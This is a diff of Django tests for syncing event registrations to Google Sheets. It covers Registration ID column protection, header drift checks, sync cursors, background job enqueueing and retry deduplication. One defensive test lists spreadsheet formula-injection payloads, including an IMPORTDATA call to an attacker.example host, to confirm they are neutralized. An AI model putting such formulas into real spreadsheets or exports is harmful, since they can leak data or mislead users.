@@ -1,6 +1,6 @@
 from unittest.mock import MagicMock, patch
 
-from django.test import TestCase
+from django.test import TestCase, override_settings
 
 from apps.event.models import Event, RegistrationSheetSyncLog
 from apps.event.services.registration_sheet_sync import (
@@ -17,6 +17,8 @@ from apps.event.services.registration_sheet_sync.rows import build_header, build
 from apps.event.services.registration_sheet_sync.sheets import (
     _get_worksheet,
     _get_worksheet_by_gid,
+    ensure_registration_id_protected,
+    registration_ids_from_values,
 )
 from apps.event.tests.helpers import make_event, make_member, make_registration, make_ticket
 
@@ -180,6 +182,64 @@ class SheetsHelperTest(TestCase):
                 _get_worksheet(self.event)
         self.assertIn("GID not found", str(ctx.exception))
 
+    def test_header_only_legacy_sheet_is_rejected_for_append(self):
+        with self.assertRaisesMessage(RegistrationSyncError, "no valid final Registration ID"):
+            registration_ids_from_values([["Order", "First Name"]])
+
+    def test_drifted_header_is_rejected_for_append(self):
+        expected = ["Order", "First Name", "Registration ID"]
+        drifted = [["Order", "Unexpected Question", "Registration ID"]]
+        with self.assertRaisesMessage(RegistrationSyncError, "no longer match"):
+            registration_ids_from_values(drifted, expected_header=expected)
+
+    def test_registration_id_column_is_protected_once(self):
+        spreadsheet = MagicMock()
+        spreadsheet.fetch_sheet_metadata.return_value = {"sheets": []}
+        worksheet = MagicMock(id=42, spreadsheet=spreadsheet)
+        header = ["Order", "Registration ID"]
+
+        ensure_registration_id_protected(
+            worksheet,
+            header,
+            editor_email="service@example.com",
+        )
+
+        worksheet.add_protected_range.assert_called_once_with(
+            "B:B",
+            editor_users_emails=["service@example.com"],
+            description="Innovate to Grow application-managed Registration ID",
+            warning_only=False,
+            requesting_user_can_edit=True,
+        )
+
+    def test_matching_registration_id_protection_is_reused(self):
+        spreadsheet = MagicMock()
+        spreadsheet.fetch_sheet_metadata.return_value = {
+            "sheets": [
+                {
+                    "properties": {"sheetId": 42},
+                    "protectedRanges": [
+                        {
+                            "description": "Innovate to Grow application-managed Registration ID",
+                            "range": {
+                                "startColumnIndex": 1,
+                                "endColumnIndex": 2,
+                            },
+                        }
+                    ],
+                }
+            ]
+        }
+        worksheet = MagicMock(id=42, spreadsheet=spreadsheet)
+
+        ensure_registration_id_protected(
+            worksheet,
+            ["Order", "Registration ID"],
+            editor_email="service@example.com",
+        )
+
+        worksheet.add_protected_range.assert_not_called()
+
 
 class RowsHelperTest(TestCase):
     def test_build_header_includes_optional_columns(self):
@@ -187,7 +247,8 @@ class RowsHelperTest(TestCase):
         header = build_header(event, ["Q1"])
         self.assertIn("Phone", header)
         self.assertIn("Membership Secondary", header)
-        self.assertEqual(header[-1], "Q1")
+        self.assertEqual(header[-2], "Q1")
+        self.assertEqual(header[-1], "Registration ID")
 
     def test_build_header_omits_optional_columns(self):
         event = make_event(collect_phone=False, allow_secondary_email=False)
@@ -219,7 +280,8 @@ class RowsHelperTest(TestCase):
         # apostrophe.
         self.assertIn("'+15551234567", row)
         self.assertIn("row2@example.com", row)
-        self.assertEqual(row[-1], "Yes")
+        self.assertEqual(row[-2], "Yes")
+        self.assertEqual(row[-1], str(registration.pk))
 
     def test_build_row_omits_optional_fields_and_blank_answer(self):
         event = make_event(collect_phone=False, allow_secondary_email=False)
@@ -229,7 +291,8 @@ class RowsHelperTest(TestCase):
 
         row = build_row(registration, event, ["Missing"], 1)
 
-        self.assertEqual(row[-1], "")
+        self.assertEqual(row[-2], "")
+        self.assertEqual(row[-1], str(registration.pk))
         self.assertNotIn("+15551234567", row)
 
     def test_build_row_neutralizes_formula_injection(self):
@@ -255,7 +318,7 @@ class RowsHelperTest(TestCase):
 
         self.assertEqual(row[1], '\'=IMPORTDATA("https://attacker.example/x")')
         self.assertEqual(row[2], "'@SUM(A1:A9)")
-        self.assertEqual(row[-1], '\'=HYPERLINK("https://evil","x")')
+        self.assertEqual(row[-2], '\'=HYPERLINK("https://evil","x")')
         # No cell handed to Sheets still begins with a raw formula trigger.
         for cell in row:
             self.assertFalse(cell.startswith(("=", "+", "-", "@")), cell)
@@ -272,17 +335,17 @@ class LogsHelperTest(TestCase):
         self.assertEqual(self.event.registration_sheet_sync_error, "oops")
         self.assertFalse(RegistrationSheetSyncLog.objects.filter(event=self.event).exists())
 
-    def test_record_sync_failure_updates_synced_at_and_rows(self):
+    def test_record_sync_failure_preserves_cursor_and_records_rows(self):
+        original_cursor = self.event.registration_sheet_synced_at
         record_sync_failure(
             self.event,
             "broke",
             sync_type=RegistrationSheetSyncLog.SyncType.APPEND,
-            update_synced_at=True,
             rows_written=0,
         )
 
         self.event.refresh_from_db()
-        self.assertIsNotNone(self.event.registration_sheet_synced_at)
+        self.assertEqual(self.event.registration_sheet_synced_at, original_cursor)
         log = RegistrationSheetSyncLog.objects.get(event=self.event)
         self.assertEqual(log.status, RegistrationSheetSyncLog.Status.FAILED)
         self.assertEqual(log.error_message, "broke")
@@ -305,40 +368,27 @@ class AppendBranchTest(TestCase):
     def test_schedule_sync_noop_without_sheet_id(self):
         from apps.event.services.registration_sheet_sync.append import schedule_registration_sync
 
-        with patch("apps.event.services.registration_sheet_sync.append.threading.Timer") as timer:
+        with patch("apps.core.services.background_jobs.enqueue_job") as enqueue:
             schedule_registration_sync(self.event)
-        timer.assert_not_called()
+        enqueue.assert_not_called()
 
-    def test_schedule_sync_registers_and_replaces_timer(self):
-        from apps.event.services.registration_sheet_sync import append as append_mod
+    @override_settings(BACKGROUND_JOBS_ENABLED=True)
+    def test_schedule_sync_enqueues_deduplicated_job_in_current_transaction(self):
         from apps.event.services.registration_sheet_sync.append import schedule_registration_sync
 
         self.event.registration_sheet_id = "sheet-id"
         self.event.save(update_fields=["registration_sheet_id", "updated_at"])
-        event_id = str(self.event.pk)
+        trigger_id = "00000000-0000-0000-0000-000000000123"
 
-        # Patch _flush_pending_sync so a fired timer is a harmless no-op, and keep
-        # the debounce long so the timers never actually fire during the test.
-        with patch.object(append_mod, "_flush_pending_sync"):
-            try:
-                schedule_registration_sync(self.event)
-                first_timer = append_mod._sync_timers.get(event_id)
-                self.assertIsNotNone(first_timer)
-                self.assertTrue(first_timer.daemon)
-                self.assertTrue(first_timer.is_alive())
+        with patch("apps.core.services.background_jobs.enqueue_job") as enqueue:
+            schedule_registration_sync(self.event, trigger_id=trigger_id)
 
-                # Calling again cancels the previous timer and registers a new one.
-                schedule_registration_sync(self.event)
-                second_timer = append_mod._sync_timers.get(event_id)
-                self.assertIsNotNone(second_timer)
-                self.assertIsNot(second_timer, first_timer)
-                # The replaced timer was cancelled (its internal finished flag is set).
-                self.assertTrue(first_timer.finished.is_set())
-            finally:
-                with append_mod._sync_lock:
-                    timer = append_mod._sync_timers.pop(event_id, None)
-                if timer:
-                    timer.cancel()
+        enqueue.assert_called_once_with(
+            kind="event.registration_sheet_sync",
+            dedupe_key=f"{self.event.pk}:{trigger_id}",
+            payload={"event_id": str(self.event.pk)},
+            can_retry_after_claim=True,
+        )
 
     @patch("apps.event.services.registration_sheet_sync.GoogleCredentialConfig.load")
     def test_flush_unconfigured_credentials_records_failure(self, mock_load):
@@ -413,6 +463,84 @@ class AppendBranchTest(TestCase):
         log = RegistrationSheetSyncLog.objects.filter(event=self.event).last()
         self.assertEqual(log.status, RegistrationSheetSyncLog.Status.FAILED)
         self.assertIn("boom", log.error_message)
+        self.event.refresh_from_db()
+        self.assertIsNone(self.event.registration_sheet_synced_at)
+
+    @patch("apps.event.services.registration_sheet_sync.GoogleCredentialConfig.load")
+    def test_registration_created_during_append_is_left_for_next_cursor(self, mock_load):
+        mock_load.return_value = MagicMock(is_configured=True)
+        self.event.registration_sheet_id = "sheet-id"
+        self.event.save(update_fields=["registration_sheet_id", "updated_at"])
+        ticket = make_ticket(self.event, name="GA")
+        first_member = make_member(email="cutoff-first@example.com")
+        second_member = make_member(email="cutoff-second@example.com")
+        make_registration(first_member, self.event, ticket)
+        sheet_rows = []
+        created_during_write = []
+        worksheet = MagicMock()
+        worksheet.get_all_values.side_effect = lambda: [list(row) for row in sheet_rows]
+
+        def append_rows(rows, **_kwargs):
+            sheet_rows.extend([list(row) for row in rows])
+            if not created_during_write:
+                created_during_write.append(make_registration(second_member, self.event, ticket))
+
+        worksheet.append_rows.side_effect = append_rows
+        with patch("apps.event.services.registration_sheet_sync._get_worksheet", return_value=worksheet):
+            _flush_pending_sync(str(self.event.pk))
+            self.event.refresh_from_db()
+            first_cursor = self.event.registration_sheet_synced_at
+            self.assertGreater(created_during_write[0].created_at, first_cursor)
+            self.assertEqual(self.event.registration_sheet_sync_count, 1)
+
+            _flush_pending_sync(str(self.event.pk))
+
+        self.event.refresh_from_db()
+        self.assertEqual(self.event.registration_sheet_sync_count, 2)
+        self.assertEqual(worksheet.append_rows.call_count, 2)
+        written_ids = {row[-1] for row in sheet_rows[1:]}
+        self.assertEqual(
+            written_ids,
+            {
+                str(first_member.event_registrations.get(event=self.event).pk),
+                str(created_during_write[0].pk),
+            },
+        )
+
+    @patch("apps.event.services.registration_sheet_sync.GoogleCredentialConfig.load")
+    def test_retry_skips_registration_id_already_written_before_db_failure(self, mock_load):
+        mock_load.return_value = MagicMock(is_configured=True)
+        self.event.registration_sheet_id = "sheet-id"
+        self.event.save(update_fields=["registration_sheet_id", "updated_at"])
+        ticket = make_ticket(self.event, name="GA")
+        member = make_member(email="retry-id@example.com")
+        registration = make_registration(member, self.event, ticket)
+        sheet_rows = []
+        worksheet = MagicMock()
+        worksheet.get_all_values.side_effect = lambda: [list(row) for row in sheet_rows]
+        worksheet.append_rows.side_effect = lambda rows, **_kwargs: sheet_rows.extend([list(row) for row in rows])
+
+        with (
+            patch("apps.event.services.registration_sheet_sync._get_worksheet", return_value=worksheet),
+            patch(
+                "apps.event.services.registration_sheet_sync.append._record_append_success",
+                side_effect=RuntimeError("database commit failed"),
+            ),
+        ):
+            _flush_pending_sync(str(self.event.pk))
+
+        self.event.refresh_from_db()
+        self.assertIsNone(self.event.registration_sheet_synced_at)
+        self.assertEqual(worksheet.append_rows.call_count, 1)
+        self.assertEqual(sheet_rows[-1][-1], str(registration.pk))
+
+        with patch("apps.event.services.registration_sheet_sync._get_worksheet", return_value=worksheet):
+            _flush_pending_sync(str(self.event.pk))
+
+        self.event.refresh_from_db()
+        self.assertEqual(worksheet.append_rows.call_count, 1)
+        self.assertEqual(self.event.registration_sheet_sync_count, 1)
+        self.assertIsNotNone(self.event.registration_sheet_synced_at)
 
     def test_flush_missing_event_handled(self):
         # event_id that doesn't exist -> Event.DoesNotExist caught by outer except.
